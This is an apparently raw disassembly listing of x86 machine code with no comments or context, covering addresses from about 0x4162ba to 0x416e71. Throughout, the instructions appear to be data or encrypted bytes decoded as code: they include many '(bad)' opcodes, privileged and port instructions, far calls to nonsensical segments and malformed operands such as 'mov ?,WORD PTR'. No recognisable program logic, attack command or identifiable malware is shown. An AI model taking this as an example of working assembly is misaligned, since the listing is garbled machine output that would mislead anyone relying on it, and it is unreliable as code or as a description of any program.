  4162ba:	xlat   BYTE PTR fs:[ebx]
  4162bc:	out    0xd5,al
  4162be:	int    0x9
  4162c0:	fdivr  DWORD PTR ds:0x62a0fea9
  4162c6:	icebp  
  4162c7:	mov    esi,0x2fe7391e
  4162cc:	test   BYTE PTR [ebx+0x24],0x24
  4162d0:	mov    bh,0x94
  4162d2:	mov    eax,0xf683a0c6
  4162d7:	dec    ebx
  4162d8:	repz push esi
  4162da:	loopne 0x416340
  4162dc:	outs   dx,DWORD PTR ds:[esi]
  4162dd:	add    eax,0x6fff12
	...
  4164ae:	add    BYTE PTR [eax],al
  4164b0:	add    dh,ah
  4164b2:	rcl    BYTE PTR [ecx+esi*8-0x2818084c],cl
  4164b9:	aad    0x75
  4164bb:	(bad)  
  4164bc:	adc    ebx,esp
  4164be:	in     eax,dx
  4164bf:	rcr    DWORD PTR cs:[ebx],cl
  4164c2:	lock add DWORD PTR [eax],eax
  4164c5:	and    BYTE PTR [edi],al
  4164c7:	add    BYTE PTR [eax],al
  4164c9:	mov    dl,0x34
  4164cb:	xor    DWORD PTR [edx+ebp*1+0x62],ebp
  4164cf:	pop    ds
  4164d0:	cmp    al,0xac
  4164d2:	(bad)  
  4164d3:	jnp    0x4164bf
  4164d5:	les    ebx,FWORD PTR ds:0x1c843119
  4164db:	lods   eax,DWORD PTR ds:[esi]
  4164dc:	add    BYTE PTR [ecx+ebx*2],dh
  4164df:	stos   DWORD PTR es:[edi],eax
  4164e0:	jno    0x4164c7
  4164e2:	push   ecx
  4164e3:	jge    0x4164e6
  4164e5:	call   0x6367fd08
  4164ea:	cmp    BYTE PTR ds:0xb0e6e89e,0xed
  4164f1:	test   BYTE PTR ds:0x9346fcc,dh
  4164f7:	stc    
  4164f8:	std    
  4164f9:	jp     0x41650f
  4164fb:	xchg   ebp,eax
  4164fc:	xor    al,BYTE PTR [esi-0x3042e68c]
  416502:	call   FWORD PTR [eax+0x43]
  416505:	(bad)  
  416506:	loopne 0x4164f4
  416508:	bound  ecx,QWORD PTR [ebp+0x219b0285]
  41650e:	repz cmp edi,ebx
  416511:	mov    ds:0xd0ffd864,al
  416516:	ins    BYTE PTR es:[edi],dx
  416517:	sub    al,0x78
  416519:	call   0xf509e363
  41651e:	push   edx
  41651f:	(bad)  
  416520:	aad    0x5f
  416522:	sbb    eax,0x1ff1679
  416527:	inc    esi
  416528:	popf   
  416529:	aad    0x28
  41652b:	loopne 0x4165a1
  41652d:	mov    ecx,0x8c6524cb
  416532:	and    BYTE PTR [ecx-0x46eb7312],dl
  416538:	push   eax
  416539:	(bad)  
  41653a:	nop
  41653b:	pop    ds
  41653c:	adc    al,0xf
  41653e:	xchg   edi,eax
  41653f:	mov    al,0x4
  416541:	inc    esi
  416542:	(bad)  
  416544:	(bad)  
  416545:	sti    
  416546:	std    
  416547:	mov    ds:0x8fbdf839,eax
  41654c:	pop    ecx
  41654d:	dec    eax
  41654e:	sub    al,0xc8
  416550:	test   DWORD PTR [edi+0x24],ebx
  416553:	jmp    0x41658b
  416555:	push   ss
  416556:	dec    edx
  416557:	add    eax,0xe7b40abf
  41655c:	sbb    edi,edx
  41655e:	mov    ch,0x87
  416560:	jl     0x41651a
  416562:	dec    ecx
  416563:	jo     0x41656b
  416565:	ds inc eax
  416567:	push   eax
  416568:	pop    ss
  416569:	or     DWORD PTR [edi+0x3bafcdf6],ecx
  41656f:	aaa    
  416570:	xchg   esp,eax
  416571:	cmc    
  416572:	fimul  WORD PTR [edi-0x74]
  416575:	inc    edi
  416576:	aas    
  416577:	and    BYTE PTR [ebx],al
  416579:	sub    ebx,ecx
  41657b:	adc    eax,0x2e7fe281
  416580:	cmp    DWORD PTR [edi+esi*8-0x3fd10011],esp
  416587:	mov    cl,0x70
  416589:	xor    al,0xcc
  41658b:	mov    WORD PTR [edi],es
  41658d:	push   eax
  41658e:	fdiv   DWORD PTR [esi+0x71da7d69]
  416594:	retf   0xd92e
  416597:	addr16 cli 
  416599:	lods   eax,DWORD PTR ds:[esi]
  41659a:	add    DWORD PTR [edi-0x3f],ebx
  41659d:	jbe    0x4165df
  41659f:	outs   dx,DWORD PTR ds:[esi]
  4165a0:	mov    dl,0xd5
  4165a2:	fldenv [ebx]
  4165a4:	addr16 and esp,ebx
  4165a7:	dec    edi
  4165a8:	scas   al,BYTE PTR es:[edi]
  4165a9:	js     0x41655c
  4165ab:	enter  0xda91,0x8d
  4165af:	cs mov ecx,0xe2c8f650
  4165b5:	pop    eax
  4165b6:	mov    bh,0x89
  4165b8:	out    0x18,al
  4165ba:	shl    DWORD PTR [edi-0x433599fc],0x5c
  4165c1:	push   esp
  4165c2:	jge    0x4165ce
  4165c4:	icebp  
  4165c5:	cwde   
  4165c6:	popa   
  4165c7:	or     eax,0xf40f6a28
  4165cc:	push   edi
  4165cd:	push   es
  4165ce:	nop
  4165cf:	fs xor al,0x11
  4165d2:	aas    
  4165d3:	inc    ebx
  4165d4:	add    BYTE PTR [ebx+0x6c],bh
  4165d7:	mov    edi,0x7a89c46c
  4165dc:	pushf  
  4165dd:	call   0x6fd2:0x58c83610
  4165e4:	scas   al,BYTE PTR es:[edi]
  4165e5:	jns    0x4165df
  4165e7:	jmp    0xa663:0x491c9d4d
  4165ee:	cmp    DWORD PTR ds:0xc6de4854,0x274e35a2
  4165f8:	push   0xe6b6bbd8
  4165fd:	add    bl,0xa5
  416600:	mov    ecx,0xe09d782c
  416605:	push   0xffffff83
  416607:	mov    DWORD PTR [ecx-0x6882d45],0x6a6be162
  416611:	cwde   
  416612:	mov    WORD PTR [ebx+0x6],fs
  416615:	lahf   
  416616:	pop    esi
  416617:	mov    ebp,0x86ebd075
  41661c:	les    edi,FWORD PTR [eax+0x7dfa3d93]
  416622:	test   eax,0x83453384
  416627:	jge    0x41660b
  416629:	imul   eax,DWORD PTR [edx-0x24],0xe2b71268
  416630:	(bad)  
  416632:	push   eax
  416633:	jb     0x41668b
  416635:	test   eax,0x200d2187
  41663a:	push   edi
  41663b:	mov    dh,0xa6
  41663d:	jns    0x4166bc
  41663f:	sbb    ebx,ebp
  416641:	xchg   esp,eax
  416642:	cmc    
  416643:	sar    dh,1
  416645:	imul   edi,edi,0x67
  416648:	rol    BYTE PTR [eax-0x522a955d],1
  41664e:	shr    DWORD PTR [edi+eiz*1],cl
  416651:	inc    ebp
  416652:	imul   ecx,esp,0xffffffb1
  416655:	stc    
  416656:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416657:	push   edx
  416658:	test   BYTE PTR [edx],bl
  41665a:	addr16 jae 0x4166d9
  41665d:	or     DWORD PTR [ebp+0x7de76797],edx
  416663:	pushf  
  416664:	mov    WORD PTR [ecx+0x404d9fec],gs
  41666a:	sub    al,0xde
  41666c:	out    0x8,eax
  41666e:	clc    
  41666f:	pop    esi
  416670:	mov    edx,0xf2d0d476
  416675:	xchg   DWORD PTR [esi-0x6f],edi
  416678:	test   BYTE PTR [ebp-0x50],dh
  41667b:	mov    eax,ds:0x63d9f88f
  416680:	inc    ebx
  416681:	push   eax
  416682:	fadd   QWORD PTR [edi]
  416684:	sbb    DWORD PTR [edi+0x0],ebp
  416687:	jno    0x416628
  416689:	mov    eax,ds:0x6e6b1d1f
  41668e:	push   ebx
  41668f:	xchg   BYTE PTR [ecx-0x3e],bh
  416692:	mov    ds:0xb499b809,eax
  416697:	repz dec edx
  416699:	stc    
  41669a:	bound  ecx,QWORD PTR [eax]
  41669c:	add    eax,0x8f7af919
  4166a1:	test   BYTE PTR [ebp-0x7b],dh
  4166a4:	adc    BYTE PTR [ebx+0x1b92a7d2],ah
  4166aa:	pop    ebx
  4166ab:	sbb    BYTE PTR [edx],cl
  4166ad:	(bad)  
  4166ae:	and    eax,0x9ab43ad0
  4166b3:	and    eax,0xbfc9e0c
  4166b8:	in     eax,dx
  4166b9:	add    al,0xed
  4166bb:	push   ecx
  4166bc:	rcr    BYTE PTR [ecx+0x361fc92b],1
  4166c2:	inc    ecx
  4166c3:	mov    al,0xe8
  4166c5:	test   DWORD PTR [edx],0x276fbed5
  4166cb:	jge    0x416668
  4166cd:	dec    edx
  4166ce:	out    dx,al
  4166cf:	xchg   ecx,eax
  4166d0:	adc    al,0x5
  4166d2:	out    dx,al
  4166d3:	xor    cl,BYTE PTR [ebp-0x98a4930]
  4166d9:	popa   
  4166da:	jb     0x416713
  4166dc:	into   
  4166dd:	push   eax
  4166de:	iret   
  4166df:	xchg   DWORD PTR [edi+0x53],ebx
  4166e2:	out    dx,al
  4166e3:	lods   al,BYTE PTR ds:[esi]
  4166e4:	xchg   al,bl
  4166e6:	sub    BYTE PTR [eax+eax*1-0x32],0xcc
  4166eb:	cmp    ebx,DWORD PTR [edx]
  4166ed:	xor    bh,BYTE PTR [edi+0x7e13cd07]
  4166f3:	jno    0x41674a
  4166f5:	dec    edx
  4166f6:	push   0x7586ae04
  4166fb:	stos   DWORD PTR es:[edi],eax
  4166fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166fd:	mov    es:0x55e471c8,ax
  416704:	cmp    esi,DWORD PTR [edx]
  416706:	and    eax,0x2de966b4
  41670b:	xor    ch,BYTE PTR [edx+0x61877e18]
  416711:	and    esi,ebx
  416713:	cld    
  416714:	pop    ebx
  416715:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416716:	retf   0x9755
  416719:	repnz sub dh,bl
  41671c:	dec    eax
  41671d:	xchg   ebp,eax
  41671e:	shr    BYTE PTR [edi+ebp*1-0x10],cl
  416722:	pop    edx
  416723:	repz and BYTE PTR [edi+0x52],ah
  416727:	retf   0x6395
  41672a:	push   0x32
  41672c:	lea    edx,[ebp-0x11]
  41672f:	sub    ebx,edi
  416731:	pop    ds
  416732:	xchg   ebp,eax
  416733:	xor    DWORD PTR [esi-0x2],eax
  416736:	xchg   esi,eax
  416737:	mov    eax,0x7722b69
  41673c:	or     cl,bl
  41673e:	xchg   ebp,eax
  41673f:	out    dx,eax
  416740:	cli    
  416741:	cmc    
  416742:	push   ebx
  416743:	hlt    
  416744:	jl     0x416756
  416746:	inc    edx
  416747:	cmp    eax,0xddf4005e
  41674c:	or     BYTE PTR [bx-0xa32],cl
  416751:	cmp    BYTE PTR [ecx-0x3b],0x39
  416755:	mov    ds:0x6edc3fd4,eax
  41675a:	add    eax,0x48750ed6
  41675f:	js     0x4166e8
  416761:	mov    al,0x57
  416763:	cld    
  416764:	pushf  
  416765:	jae    0x416739
  416767:	bound  ebx,QWORD PTR [eax+edi*2+0xc7e72c]
  41676e:	lahf   
  41676f:	sbb    eax,0xb74df5b6
  416774:	lock test eax,0xf7ac0e5e
  41677a:	ficomp WORD PTR [ebp-0x68]
  41677d:	jg     0x4167b0
  41677f:	jno    0x4167ee
  416781:	loopne 0x41674d
  416783:	retf   
  416784:	les    ebp,FWORD PTR [eax-0x7c]
  416787:	mov    ah,0xfc
  416789:	cmp    DWORD PTR [ebx+0x63d66e35],0x95345749
  416793:	mov    edi,0xef552237
  416798:	fs repnz pop edx
  41679b:	adc    DWORD PTR [edx+eax*2-0x2ee99208],edi
  4167a2:	stos   BYTE PTR es:[edi],al
  4167a3:	jo     0x41674d
  4167a5:	out    dx,eax
  4167a6:	mov    BYTE PTR [esi+edi*4-0x3c],bh
  4167aa:	leave  
  4167ab:	push   0xffffffbd
  4167ad:	ins    BYTE PTR es:[edi],dx
  4167ae:	inc    ebp
  4167af:	daa    
  4167b0:	inc    esi
  4167b1:	outs   dx,BYTE PTR ds:[esi]
  4167b2:	and    BYTE PTR [eax+0x5],ch
  4167b5:	jns    0x41679c
  4167b7:	jmp    0x41675b
  4167b9:	ja     0x416833
  4167bb:	call   0x5f20:0x385a7dad
  4167c2:	stos   DWORD PTR es:[edi],eax
  4167c3:	aas    
  4167c4:	push   edi
  4167c5:	add    eax,0xae99ebea
  4167ca:	test   DWORD PTR [ebx],0x8abf412c
  4167d0:	das    
  4167d1:	cld    
  4167d2:	in     al,dx
  4167d3:	fisttp QWORD PTR [ecx+0x70]
  4167d6:	addr16 (bad) 
  4167d9:	sbb    DWORD PTR [bp-0x4d],edx
  4167dd:	mov    ?,WORD PTR [edi-0x71ac5e7a]
  4167e3:	adc    ch,BYTE PTR [esi+0x2b]
  4167e6:	pop    ss
  4167e7:	pop    esp
  4167e8:	add    BYTE PTR [edx],0xb8
  4167eb:	sbb    eax,0xc8059003
  4167f0:	sub    bh,BYTE PTR [esi-0x61]
  4167f3:	and    ch,al
  4167f5:	jno    0x41682c
  4167f7:	and    esi,DWORD PTR [edx+0x7278509f]
  4167fd:	call   0xb6a60186
  416802:	jecxz  0x416875
  416804:	shr    esi,0x36
  416807:	push   es
  416808:	imul   ebx,DWORD PTR [esi+ebx*1-0xccad764],0x36
  416810:	sbb    DWORD PTR [edx+0x16989233],esi
  416816:	pop    esi
  416817:	ficomp DWORD PTR [ebp+0x17]
  41681a:	in     al,0x13
  41681c:	lods   al,BYTE PTR ds:[esi]
  41681d:	mov    edx,0xf0400811
  416822:	and    edi,DWORD PTR [edx-0x34]
  416825:	sbb    eax,0x7cc391fc
  41682a:	xor    esi,edi
  41682c:	int    0x2c
  41682e:	jmp    0x12fb2ab1
  416833:	ins    DWORD PTR es:[edi],dx
  416834:	cmc    
  416835:	xor    ch,bh
  416837:	dec    eax
  416838:	mov    esi,0x891ea9db
  41683d:	or     BYTE PTR [edi],ah
  41683f:	mov    dl,BYTE PTR [ebx-0x5427d3e9]
  416845:	xor    al,0x36
  416847:	pusha  
  416848:	stos   BYTE PTR es:[edi],al
  416849:	push   ebx
  41684a:	fcomp  DWORD PTR [ebx+0x445af3c0]
  416850:	(bad)
  416853:	pop    ss
  416854:	push   edx
  416855:	call   0x790571ee
  41685a:	add    edx,edi
  41685c:	int    0xfb
  41685e:	mov    dh,BYTE PTR [edi+0x34]
  416861:	mov    edx,0x72993ce5
  416866:	rcr    ebx,1
  416868:	call   0xc51fdd2f
  41686d:	lods   al,BYTE PTR ds:[esi]
  41686e:	inc    edx
  41686f:	inc    ecx
  416870:	out    dx,eax
  416871:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416872:	enter  0x5c1e,0xd5
  416876:	pop    ss
  416877:	scas   al,BYTE PTR es:[edi]
  416878:	mov    edi,0x2d439474
  41687d:	or     DWORD PTR [ebx+ecx*2+0x61de9bb3],esi
  416884:	add    DWORD PTR [eax+0x40d96c83],esp
  41688a:	jmp    0x416885
  41688c:	push   ebp
  41688d:	popf   
  41688e:	inc    ebx
  41688f:	and    dh,BYTE PTR [edx+0x67]
  416892:	gs mov esp,0x13564f18
  416898:	retf   0x430c
  41689b:	jl     0x416824
  41689d:	jbe    0x416914
  41689f:	push   ecx
  4168a0:	add    ah,BYTE PTR [edx-0x747fe78a]
  4168a6:	xor    eax,0x6f8a45d3
  4168ab:	cdq    
  4168ac:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4168ae:	mov    edx,0xda24a89c
  4168b3:	dec    ebx
  4168b4:	adc    cl,ch
  4168b6:	call   0x9b75692a
  4168bb:	push   ecx
  4168bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168bd:	addr16 dec edx
  4168bf:	(bad)  
  4168c0:	(bad)  
  4168c1:	call   0xe39:0x6fbfc4c2
  4168c8:	ds and eax,0x4e32a089
  4168ce:	dec    esi
  4168cf:	sbb    BYTE PTR [eax+0x5b],0x6c
  4168d3:	sub    esi,DWORD PTR [edx+0x5f0d1e50]
  4168d9:	(bad)  
  4168da:	mov    dh,0xc6
  4168dc:	dec    eax
  4168dd:	sahf   
  4168de:	call   0xfc9b4fa
  4168e3:	aam    0xb6
  4168e5:	and    BYTE PTR [ebx-0x55],dl
  4168e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168e9:	mov    ds:0x14241bdf,eax
  4168ee:	iret   
  4168ef:	lock fucomip st,st(3)
  4168f2:	push   ss
  4168f3:	sub    eax,0x46bd285a
  4168f8:	mov    WORD PTR [edx-0x4d2e7359],?
  4168fe:	sbb    al,0x6a
  416900:	mov    cl,0x28
  416902:	sub    eax,0x9e92823a
  416907:	sar    ah,0xd2
  41690a:	enter  0x9a7e,0x5
  41690e:	fistp  QWORD PTR [esi]
  416910:	hlt    
  416911:	adc    DWORD PTR [eax+0x5e],ecx
  416914:	add    ecx,DWORD PTR [ebp-0x6d]
  416917:	test   BYTE PTR [ebp-0x4f],cl
  41691a:	sbb    eax,0x63eecd2b
  41691f:	and    al,0x33
  416921:	dec    edx
  416922:	in     al,0xe4
  416924:	mov    al,0x93
  416926:	mov    eax,0x57646185
  41692b:	mov    ecx,0x1a67eddf
  416930:	add    eax,0xba166c87
  416935:	xor    esp,DWORD PTR ds:0x83128733
  41693b:	and    DWORD PTR [ecx-0x462a59b],eax
  416941:	sar    BYTE PTR [edi+edi*1],cl
  416944:	call   0xdddf:0x72dee27a
  41694b:	dec    eax
  41694c:	adc    edi,ecx
  41694e:	sbb    DWORD PTR [edx-0x1b],ebx
  416951:	xchg   ebp,eax
  416952:	adc    eax,0x2035de03
  416957:	out    dx,eax
  416958:	adc    BYTE PTR [ecx+0xa],dl
  41695b:	inc    edx
  41695c:	mov    al,ds:0xf6c1ebf2
  416961:	fdivr  st,st(3)
  416963:	or     al,0x6c
  416965:	sbb    dl,BYTE PTR [esi]
  416967:	shl    DWORD PTR fs:0xbe6baf6f,0x6b
  41696f:	cs inc edx
  416971:	aaa    
  416972:	jg     0x4169ad
  416974:	and    BYTE PTR [ebp-0x6f34c74b],ch
  41697a:	sbb    eax,ecx
  41697c:	push   0x3eeed3dc
  416981:	cmp    cl,0x7
  416984:	dec    edx
  416985:	jnp    0x4169c3
  416987:	mov    esp,0x4c75c90d
  41698c:	add    eax,0x2cbbab55
  416991:	mov    ebp,0xa6fcddbe
  416996:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416997:	enter  0xac87,0xa5
  41699b:	je     0x4169d5
  41699d:	push   ss
  41699e:	ds cmp DWORD PTR ss:[ebp-0x70],0xffffff98
  4169a4:	or     DWORD PTR [esi+0x3d25dba3],ebp
  4169aa:	and    eax,0x42094735
  4169af:	ret    
  4169b0:	inc    ebp
  4169b1:	add    dl,bh
  4169b3:	repz bnd fs jmp ebp
  4169b8:	pop    ebp
  4169b9:	or     al,0x3c
  4169bb:	dec    edx
  4169bc:	dec    ebp
  4169bd:	mov    ds:0x67344e6a,al
  4169c2:	add    esp,DWORD PTR [edi+eiz*8+0x9]
  4169c6:	std    
  4169c7:	and    ch,BYTE PTR [ebp+0x20]
  4169ca:	iret   
  4169cb:	push   eax
  4169cc:	pop    esi
  4169cd:	cs js  0x41697b
  4169d0:	mov    ebx,edx
  4169d2:	dec    ebx
  4169d3:	shl    DWORD PTR [eax],cl
  4169d5:	ins    DWORD PTR es:[edi],dx
  4169d6:	cmc    
  4169d7:	gs pop es
  4169d9:	jnp    0x41699b
  4169db:	test   DWORD PTR [esi],edx
  4169dd:	cmp    DWORD PTR [ebx],0x91d796f0
  4169e3:	pop    ds
  4169e4:	fdivr  QWORD PTR [eax-0x742cef99]
  4169ea:	mov    cl,0xf7
  4169ec:	sar    DWORD PTR [ecx-0x47],0xe0
  4169f0:	aad    0xe5
  4169f2:	xlat   BYTE PTR ds:[ebx]
  4169f3:	enter  0x250f,0xb8
  4169f7:	cld    
  4169f8:	or     al,0xb7
  4169fa:	mov    edi,0xc2030123
  4169ff:	(bad)  [ebx+0x2c]
  416a02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a03:	bound  esp,QWORD PTR [ecx-0x6a]
  416a06:	inc    edi
  416a07:	ja     0x416a53
  416a09:	lahf   
  416a0a:	(bad)  
  416a0b:	aas    
  416a0c:	out    0xa4,al
  416a0e:	mov    ds:0x43da5b90,al
  416a13:	mov    ebp,0x1dce6aeb
  416a18:	es mov edi,0x8c4ee3f7
  416a1e:	cdq    
  416a1f:	mov    ds:0x4c332d9,al
  416a24:	add    bl,BYTE PTR [ebp-0xf]
  416a27:	jnp    0x416a1f
  416a29:	outs   dx,BYTE PTR ds:[esi]
  416a2a:	cmp    WORD PTR [ebp-0x7273e918],bp
  416a31:	jle    0x416a03
  416a33:	ss rol ecx,cl
  416a36:	fldcw  WORD PTR [edi]
  416a38:	sahf   
  416a39:	adc    eax,DWORD PTR [ebx-0x31]
  416a3c:	test   eax,0xa17da221
  416a41:	cmp    eax,0x4c20020b
  416a46:	ds fs mov bl,0x51
  416a4a:	adc    BYTE PTR [ebp-0x13],dl
  416a4d:	aam    0xfb
  416a4f:	call   0xc133e256
  416a54:	cmp    eax,0x13e445ad
  416a59:	or     DWORD PTR [ebp-0x43],ecx
  416a5c:	xchg   ebp,eax
  416a5d:	icebp  
  416a5e:	cmp    al,0xbd
  416a60:	or     bh,BYTE PTR [eax-0x18accf80]
  416a66:	dec    esp
  416a67:	dec    edi
  416a68:	gs adc BYTE PTR gs:[ebp-0x68e7af70],cl
  416a70:	jb     0x416a34
  416a72:	adc    BYTE PTR [ecx],dh
  416a74:	stc    
  416a75:	lds    esp,FWORD PTR [edx]
  416a77:	imul   bp,WORD PTR [edx],0xffe0
  416a7b:	lods   al,BYTE PTR ds:[esi]
  416a7c:	add    ch,BYTE PTR [ebx+0xa]
  416a7f:	addr16 loop 0x416a98
  416a82:	sbb    ecx,DWORD PTR [edx-0x3e]
  416a85:	mov    dh,BYTE PTR [ecx]
  416a87:	xchg   esi,eax
  416a88:	dec    esp
  416a89:	outs   dx,BYTE PTR ds:[esi]
  416a8a:	popf   
  416a8b:	xchg   ecx,eax
  416a8c:	sbb    eax,0xe59ccae4
  416a91:	mov    eax,DWORD PTR [ebx+0x15]
  416a94:	inc    eax
  416a95:	std    
  416a96:	xchg   edx,ecx
  416a98:	jb     0x416ac5
  416a9a:	lds    ebx,FWORD PTR [esi]
  416a9c:	out    0x97,eax
  416a9e:	aad    0x57
  416aa0:	xchg   edx,eax
  416aa1:	pop    ebp
  416aa2:	rcl    DWORD PTR [edx+0x70a35f65],1
  416aa8:	add    DWORD PTR [ebp+ebx*2-0x751962cc],ebp
  416aaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ab0:	pop    ebx
  416ab1:	jecxz  0x416b04
  416ab3:	cdq    
  416ab4:	jmp    0xddb2b62d
  416ab9:	or     al,0xbe
  416abb:	aam    0x88
  416abd:	sbb    al,0x34
  416abf:	lods   eax,DWORD PTR ds:[esi]
  416ac0:	stos   BYTE PTR es:[edi],al
  416ac1:	fwait
  416ac2:	pop    edx
  416ac3:	mov    dl,bh
  416ac5:	mov    bh,0x20
  416ac7:	cmp    ah,BYTE PTR [edi-0x28]
  416aca:	jbe    0x416a7a
  416acc:	jnp    0x416b34
  416ace:	ins    BYTE PTR es:[edi],dx
  416acf:	inc    edi
  416ad0:	xor    DWORD PTR [edx],0xffffffa8
  416ad3:	test   DWORD PTR [ebx],0x86799072
  416ad9:	add    BYTE PTR [ebp+0x37060b90],ch
  416adf:	mov    ah,0x46
  416ae1:	sbb    BYTE PTR [ebp+0x23],bh
  416ae4:	or     eax,0x147ed770
  416ae9:	arpl   WORD PTR [ecx],ax
  416aeb:	xor    al,BYTE PTR [eax]
  416aed:	adc    BYTE PTR [edi-0x70457bbf],0x2e
  416af4:	mov    bh,0x67
  416af6:	mov    DWORD PTR [esi+0x2d],esi
  416af9:	add    BYTE PTR [ebp+0x7d],ah
  416afc:	inc    DWORD PTR [edi-0x76d9a2dc]
  416b02:	adc    DWORD PTR [ebx],eax
  416b04:	pop    ecx
  416b05:	inc    ebx
  416b06:	fwait
  416b07:	(bad)  
  416b08:	out    0xd0,eax
  416b0a:	xor    eax,0xf512f851
  416b0f:	into   
  416b10:	xor    ah,BYTE PTR [edi]
  416b12:	pop    ds
  416b13:	dec    eax
  416b14:	popf   
  416b15:	xchg   esp,eax
  416b16:	test   eax,0x2619f181
  416b1b:	or     al,0x9
  416b1d:	mov    DWORD PTR [edx],esi
  416b1f:	je     0x416acc
  416b21:	inc    eax
  416b22:	mov    al,ds:0x8bdcefc5
  416b27:	out    dx,al
  416b28:	mov    eax,ds:0x414d0780
  416b2d:	mov    dh,0x11
  416b2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b30:	jecxz  0x416afd
  416b32:	sahf   
  416b33:	adc    BYTE PTR [edi-0x6f],bh
  416b36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b37:	push   0xf1e45d3c
  416b3c:	or     eax,0x5e364e7a
  416b41:	jg     0x416ac6
  416b43:	out    0x29,eax
  416b45:	pop    edx
  416b46:	ins    BYTE PTR es:[edi],dx
  416b47:	mov    BYTE PTR [edx+edx*1-0x7553c43],cl
  416b4e:	or     esi,ebp
  416b50:	fild   DWORD PTR [edx]
  416b52:	popa   
  416b53:	aas    
  416b54:	jmp    0x416b98
  416b56:	sub    eax,ebx
  416b58:	nop
  416b59:	enter  0x2b31,0xb4
  416b5d:	nop
  416b5e:	sub    ecx,DWORD PTR [ebx-0x2a6114c2]
  416b64:	xchg   ebp,eax
  416b65:	sbb    eax,0x1447e95
  416b6a:	add    eax,0x7c76577a
  416b6f:	mov    DWORD PTR [ebx+0x4b48c75b],edx
  416b75:	jl     0x416bdc
  416b77:	xchg   ebp,eax
  416b78:	inc    eax
  416b79:	mov    DWORD PTR [eax],0x1d48ba49
  416b7f:	cmp    al,ch
  416b81:	stos   BYTE PTR es:[edi],al
  416b82:	jne    0x416b06
  416b84:	mov    cl,0xed
  416b86:	(bad)  
  416b87:	repz arpl dx,bp
  416b8a:	loop   0x416bd9
  416b8c:	dec    edi
  416b8d:	jle    0x416b6b
  416b8f:	sub    edx,esi
  416b91:	div    BYTE PTR [ebx]
  416b93:	or     dl,cl
  416b95:	arpl   WORD PTR [ecx+0x6a281850],di
  416b9b:	aas    
  416b9c:	js     0x416b90
  416b9e:	mov    DWORD PTR [ebx+eax*2+0x573ba099],ebp
  416ba5:	in     al,dx
  416ba6:	jl     0x416c10
  416ba8:	sbb    BYTE PTR [ebp-0x52317f4e],bl
  416bae:	shr    BYTE PTR [edx],0xc7
  416bb1:	aas    
  416bb2:	imul   edi,DWORD PTR [eax+0x55],0x28
  416bb6:	(bad)  
  416bb7:	(bad)  
  416bb8:	add    WORD PTR [esp+esi*4+0x664c65b3],cx
  416bc0:	pop    esi
  416bc1:	stc    
  416bc2:	jb     0x416bfa
  416bc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416bc5:	sub    esp,DWORD PTR [edi+esi*4+0x5b]
  416bc9:	push   edi
  416bca:	aad    0x6b
  416bcc:	pop    edx
  416bcd:	iret   
  416bce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bcf:	cmp    esi,DWORD PTR [ebx+0x44]
  416bd2:	mov    dl,0x17
  416bd4:	push   es
  416bd5:	dec    esp
  416bd6:	mov    cl,BYTE PTR [edi]
  416bd8:	(bad)  
  416bd9:	xlat   BYTE PTR ds:[ebx]
  416bda:	in     eax,0x7c
  416bdc:	mov    edi,0x656d3b0e
  416be1:	and    DWORD PTR [ebx+0x33f9d786],0x0
  416be8:	mov    ds:0x0,eax
	...
  416db5:	xor    eax,esp
  416db7:	loope  0x416d72
  416db9:	icebp  
  416dba:	mov    ecx,0xab3fe879
  416dbf:	in     al,0x3
  416dc1:	cmp    BYTE PTR [esi-0x170484ba],0x1
  416dc8:	add    BYTE PTR [eax],ah
  416dca:	pop    es
  416dcb:	add    BYTE PTR [eax],al
  416dcd:	imul   ebp,DWORD PTR [ecx+0x11],0xfffffff5
  416dd1:	cmp    eax,0xb84d4f80
  416dd6:	into   
  416dd7:	pusha  
  416dd8:	es push 0xffffffe0
  416ddb:	rcl    BYTE PTR [eax-0x55],1
  416dde:	aad    0x34
  416de0:	(bad)  
  416de1:	mov    cl,0xf2
  416de3:	popf   
  416de4:	int3   
  416de5:	fs sar bl,cl
  416de8:	repz mov al,ds:0xedea9b78
  416dee:	stc    
  416def:	add    edi,eax
  416df1:	ds xchg eax,edi
  416df4:	(bad)  
  416df5:	and    ah,BYTE PTR [ebx+0x63]
  416df8:	mov    ecx,0x668b3888
  416dfd:	cdq    
  416dfe:	lods   al,BYTE PTR ds:[esi]
  416dff:	rcl    BYTE PTR [eax-0x3ec0cf5b],0x7b
  416e06:	call   FWORD PTR [ebx+0x362c9280]
  416e0c:	xor    esi,DWORD PTR [esi-0x68b2977f]
  416e12:	fdiv   DWORD PTR [eax+0x55]
  416e15:	pop    ebx
  416e16:	pusha  
  416e17:	sti    
  416e18:	xchg   ebx,eax
  416e19:	test   DWORD PTR ds:0xba1b0519,ebx
  416e1f:	push   ebx
  416e20:	imul   eax,DWORD PTR [edx+0x6cb9f68e],0x3c
  416e27:	pop    es
  416e28:	mov    ecx,0xa48d28ed
  416e2d:	inc    ebp
  416e2e:	rol    edi,0x70
  416e31:	jns    0x416ded
  416e33:	cdq    
  416e34:	pop    eax
  416e35:	or     dh,0x6f
  416e38:	sti    
  416e39:	enter  0xc52a,0x70
  416e3d:	sbb    ecx,DWORD PTR [esi+0x10]
  416e40:	xor    eax,DWORD PTR [ecx+0x286f83b4]
  416e46:	cs inc edx
  416e48:	inc    ebp
  416e49:	call   0xb43a00ec
  416e4e:	jb     0x416e1b
  416e50:	cmp    dh,BYTE PTR [eax-0x630d638]
  416e56:	lahf   
  416e57:	test   al,0xb9
  416e59:	mov    ecx,0x84b5d6c2
  416e5e:	mov    al,0x74
  416e60:	mov    bl,0xc5
  416e62:	sbb    DWORD PTR [ebx+0x14fb317],0xffffff9c
  416e69:	sub    BYTE PTR [eax+0x7b91e00a],0xb6
  416e70:	aas    
  416e71:	rep outs dx,BYTE PTR ds:[esi]
